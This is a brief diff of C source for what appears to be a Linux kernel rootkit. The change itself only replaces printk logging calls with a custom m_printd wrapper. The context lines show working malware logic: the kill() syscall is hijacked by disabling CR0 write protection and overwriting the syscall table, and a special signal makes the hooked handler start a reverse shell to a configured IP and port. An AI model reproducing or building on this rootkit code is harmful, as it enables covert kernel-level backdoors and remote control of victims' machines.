@@ -52,7 +52,7 @@ int new_kill(const struct pt_regs *pt_regs)
             break;
         case SIGNAL_REVERSE_SHELL:
             start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
-            printk(KERN_INFO "CALL REV SHELL WITH SIG");
+            m_printd(KERN_INFO "CALL REV SHELL WITH SIG");
             break;
         default:
         return old_kill(pt_regs);
@@ -64,10 +64,10 @@ void hijack_kill(void) {
     unsigned long old_cr0 = unprotect_memory();
 
     old_kill = (sysfun_t)syscall_table[__NR_kill];
-    printk(KERN_INFO "Old kill @ %p", old_kill);
+    m_printd(KERN_INFO "Old kill @ %p", old_kill);
 
     syscall_table[__NR_kill] = (uint64_t)new_kill;
-    printk(KERN_INFO "Hooked kill(), new kill @ %p", &syscall_table[__NR_kill]);
+    m_printd(KERN_INFO "Hooked kill(), new kill @ %p", &syscall_table[__NR_kill]);
     protect_memory(old_cr0);
 }
 void module_show(void)
